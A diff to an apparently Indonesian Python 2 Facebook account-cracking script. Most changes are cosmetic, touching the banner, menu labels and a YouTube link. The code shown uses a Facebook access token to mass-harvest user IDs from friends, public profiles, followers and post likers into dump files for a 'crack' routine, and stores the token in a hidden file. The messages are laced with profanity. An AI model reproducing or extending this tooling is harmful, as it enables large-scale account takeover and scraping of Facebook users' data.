@@ -84,15 +84,15 @@ def jalan(z):
 def tod():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
-        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
+        print '\r %s[%s+%s] berhasil menghapus token %s'%(N,M,N,x),
         sys.stdout.flush()
         time.sleep(1)
 
 # LO KONTOL
-logo = ''' \033[0;96m __  ______  ____         
- \033[0;96m  /  |/  / _ )/ __/ ® \033[0m|| Author : Aang-XD.021
- \033[0;96m  / /___/ / /|_/ / _  / _/     \033[0m|| Github : Github.com/AangGnz-xyz
- \033[0;96m  /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/clubfunbike'''
+logo = ''' \033[0;96m __  __        __  ______  ____
+ \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ™ \033[0m|| [Author By AangSans-Xyz]
+ \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| [Github.com/Aang021]
+ \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.7  \033[0m|| [Facebook.com/clubfunbike]'''
 
 lo_ngentod = '1714009362122228'
 # crack selesai
@@ -122,8 +122,8 @@ def yayanxd():
         print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
         print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
-        raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
-        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
+        raw_input(' %s*%s TEKAN ENTER '%(O,N));wuhan(kontol)
+        os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
         moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
@@ -145,19 +145,19 @@ def moch_yayan():
     print logo
     IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
     print '___________________________________________________________\n';time.sleep(0.03)
-    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
-    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
+    print ' (\033[0;96m•\033[0m) YOUR NAME : %s'%(nama);time.sleep(0.03)
+    print ' (\033[0;96m•\033[0m) YOUR IP    : %s'%(IP)
     print '___________________________________________________________\n';time.sleep(0.03)
-    print ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
-    print ' [%s2%s]. Dump id dari teman atau publik'%(O,N);time.sleep(0.03)
-    print ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
-    print ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
-    print ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)
-    print ' [%s6%s]. Check ingformasi akun fb'%(O,N);time.sleep(0.03)
-    print ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
-    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
-    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
-    print ' [%s0%s]. log out/hapus token (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
+    print ' [%s01%s]. Dump ID dari teman'%(O,N);time.sleep(0.03)
+    print ' [%s02%s]. Dump ID dari teman atau publik'%(O,N);time.sleep(0.03)
+    print ' [%s03%s]. Dump ID dari total followers'%(O,N);time.sleep(0.03)
+    print ' [%s04%s]. Dump ID dari like postingan'%(O,N);time.sleep(0.03)
+    print ' [%s05%s]. Mulai crack'%(O,N);time.sleep(0.03)
+    print ' [%s06%s]. Check informasi akun fb'%(O,N);time.sleep(0.03)
+    print ' [%s07%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
+    print ' [%s08%s]. Setting user agent'%(O,N);time.sleep(0.03)
+    print ' [%s09%s]. Info %sscript%s'%(O,N,O,N);time.sleep(0.03)
+    print ' [%s00%s]. Log out/Keluar (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [*] menu : ')
     if pepek == '':
         print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
@@ -248,12 +248,12 @@ def teman(kontol):
 
         ys.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
+        print ' [%s•%s] salin file dump👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 '''
 																																																				csy = 'Cindy sayang Yayan'
@@ -265,9 +265,9 @@ def publik(kontol):
         os.mkdir('dump')
     except:pass
     try:
-        csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
+        csy = raw_input('\n %s[%s?%s] ID publik  : '%(N,O,N))
         ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
-        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
+        ihh = raw_input(' %s[%s?%s] limit ID   : '%(N,O,N))
         knt = ('dump/' + ahh + '.json').replace(' ', '_')
         ys  = open(knt, 'w')
         for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
@@ -279,13 +279,13 @@ def publik(kontol):
             time.sleep(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
+        jalan('\n\n %s[%s✓%s] berhasil dump ID dari teman publik'%(N,H,N))
+        print ' [%s•%s] salin file dump👉 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(knt)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # dump id dari followers hehe
@@ -308,13 +308,13 @@ def followers(kontol):
             time.sleep(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
+        jalan('\n\n %s[%s✓%s] berhasil dump ID dari total followers'%(N,H,N))
+        print ' [%s•%s] salin file dump👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ah)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # dump id dari followers hehe
@@ -337,13 +337,13 @@ def followers(kontol):
             time.sleep(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
+        jalan('\n\n %s[%s✓%s] berhasil dump ID dari total followers'%(N,H,N))
+        print ' [%s•%s] salin file dump👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ah)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # dump id dari postingan hehe
@@ -352,9 +352,9 @@ def postingan(kontol):
         os.mkdir('dump')
     except:pass
     try:
-        csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
+        csy = raw_input('\n %s[%s?%s] ID posting : '%(N,O,N))
         ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
-        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
+        asw = raw_input(' %s[%s?%s] limit ID   : '%(N,O,N))
         ahh = ('dump/' + ppk + '.json').replace(' ', '_')
         ys  = open(ahh, 'w')
         for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
@@ -366,21 +366,21 @@ def postingan(kontol):
             time.sleep(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
-        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
+        jalan('\n\n %s[%s✓%s] berhasil dump ID dari like postingan'%(N,H,N))
+        print ' [%s•%s] salin file dump👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ahh)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # cek ingfo
 def cek_ingfo(kontol):
     try:
-        user = raw_input("\n [%s+%s] masukan id atau username : "%(O,N))
+        user = raw_input("\n [%s+%s] masukan ID atau username : "%(O,N))
         if user == '':
-            print "\n [%s!%s] jangan kosong bro"%(M,N);cek_ingfo(kontol)
+            print "\n [%s!%s] JANGAN KOSONG NGENTOD!!"%(M,N);cek_ingfo(kontol)
         url = ("https://lookup-id.com/")
         if "facebook" in user:
             payload = {"fburl": user, "check": "Lookup"}
@@ -548,7 +548,7 @@ def yo_ndak_tau_ko_tanya_saia():
         print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
     try:
         open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
-        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
+        ('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
     except:pass
 
